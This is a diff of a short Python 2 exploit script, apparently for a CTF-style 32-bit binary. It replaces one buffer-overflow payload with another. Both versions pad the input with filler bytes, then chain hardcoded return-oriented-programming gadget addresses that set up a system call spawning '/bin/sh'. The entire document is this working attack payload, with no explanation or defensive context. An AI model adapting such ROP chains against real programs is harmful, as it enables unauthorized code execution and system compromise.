@@ -1,10 +1,21 @@
-shell = "/bin/sh"
-shellptr = "\x3c\x7e\xfe\xbf"
-popebx = "\xc2\x73\x05\x08"
-movebxeax = "\xb4\x85\x05\x08"
-inceax = "\x1c\x0c\x05\x08"
-popall = '\xc0\x73\x05\x08'
-intx80 = "\x93\x74\x05\x08"
-nullptr = "\x4c\x7e\xfe\xbf"
-print "a"*108+"\x01"*4+popebx+"\xff"*4+movebxeax+"a"*16+(inceax+"aaaa")*12+popall+nullptr+nullptr+shellptr+intx80+shell+"\x00"
+from struct import pack
 
+print "a"*112 +\
+	pack("<I", 0x08051750)+\
+	pack("<I", 0x0805733A)+\
+	pack("<I", 0xBFFE7DD4)+\
+	pack("<I", 0x080497D2)+\
+	pack("<I", 0x08057361)+\
+	pack("<I", 0xBFFE7DE8)+\
+	pack("<I", 0xBFFE7DF0)+\
+	pack("<I", 0x08051750)+\
+	pack("<I", 0x0807C3E2)+\
+	"a"*4+\
+	pack("<I", 0x0805733A)+\
+	pack("<I", 0xBFFE7DEC)+\
+	pack("<I", 0x08057433)+\
+	"a"*8+\
+	pack("<I", 0xBFFE7DF0)+\
+	"A"*4+\
+	"/bin/sh"+"\x00"
+	
